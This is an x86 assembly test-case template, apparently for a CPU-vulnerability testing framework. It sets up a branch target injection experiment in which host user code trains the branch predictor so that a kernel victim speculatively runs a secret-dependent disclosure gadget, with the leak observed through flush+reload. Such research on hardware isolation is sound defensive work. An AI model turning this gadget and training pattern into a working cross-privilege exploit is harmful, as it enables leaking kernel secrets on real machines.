.intel_syntax noprefix

# ============================================================================
# k2u bti (aligned, transient-only): host-user attacker trains btb; host-kernel
# victim mispredicts into a disclosure gadget. shared f+r channel via host<->host
# aliasing (user.data_alias=kvictim). same design as template-gs2hu-transient-
# aligned.asm, but both actors are in the host address space, so btb collision is
# feasible (this is the boundary gs->hu couldn't align).
#
# transitions: main<->user via k2u/u2k; main<->kvictim via the generic `switch`
# (kernel<->kernel). alignment: user `train` and victim `victim_1` are both the
# first function in their section and share an identical prefix so their jmps and
# their disclosure gadgets land at the same in-section offset. the victim gets an
# 8-byte pad to compensate for the attacker's k2u landing macro.
#
# controls: template-k2u-bti-no-jmp.asm removes both jmps (expect clean).
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_k2u_target.user.function_user_0: nop qword ptr [rax + 0xff]
.macro.set_u2k_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_k2u.user.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_u2k.main_1: nop qword ptr [rax + 0xff]
# user (attacker) trains the btb
.macro.set_k2u_target.user.function_user_train: nop qword ptr [rax + 0xff]
.macro.set_u2k_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_k2u.user.1: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_u2k.main_2: nop qword ptr [rax + 0xff]
# run the kernel victim (mispredict -> disclosure); no ibpb in between
.macro.switch.kvictim.function_victim_1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
# user measures
.macro.set_k2u_target.user.function_user_measure: nop qword ptr [rax + 0xff]
.macro.set_u2k_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_k2u.user.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_u2k.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- user (host user, observer) -------------------
# function_user_train first (offset 0) to mirror function_victim_1.
.section .data.user
.function_user_train:
.macro.landing_k2u.user_1: nop qword ptr [rax + 0xff]
# mirror the victim's prefix (same 6 loads at fixed addrs -> fixed footprint, no leak)
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rax, qword ptr [rip + .function_user_disclosure]  # noremove
jmp rax  # noremove                                   # trains btb[this pc] = disclosure

.function_user_safe:
lfence  # noremove
.macro.switch_u2k.main.user_safe: nop qword ptr [rax + 0xff]
lfence  # noremove

.function_user_disclosure:
lfence  # noremove   (architectural jmp target; inert)
.macro.switch_u2k.main.user_1: nop qword ptr [rax + 0xff]
lfence

.function_user_0:
.macro.landing_k2u.user_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.user_0: nop qword ptr [rax + 0xff]
.macro.switch_u2k.main.user_0: nop qword ptr [rax + 0xff]
lfence

.function_user_measure:
.macro.landing_k2u.user_2: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.measurement_end.user_2: nop qword ptr [rax + 0xff]
.macro.switch_u2k.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (host kernel) -------------------------
.section .data.kvictim
.function_victim_1:
# 8-byte pad to match the attacker's k2u landing macro (alignment).
nop qword ptr [rax + 0xff]  # noremove
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_victim_safe]  # noremove
jmp rbx  # noremove                     # arch -> safe;  mispredict -> disclosure

.function_victim_safe:
lfence  # noremove
.macro.switch.main.function_main_3: nop qword ptr [rax + 0xff]
lfence

.function_victim_disclosure:
# mask to a cache-line index within the main page (0..0xfc0): only the main page is shared
# via the host alias, so the transient footprint must land there for the observer to f+r it.
and rax, 0b111111000000  # noremove
mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load, main page)
and rcx, 0b111111000000  # noremove
mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache, main page)
lfence  # noremove
# transient-only; switch target differs from victim_safe just to keep the macro label unique
.macro.switch.main.function_main_4: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
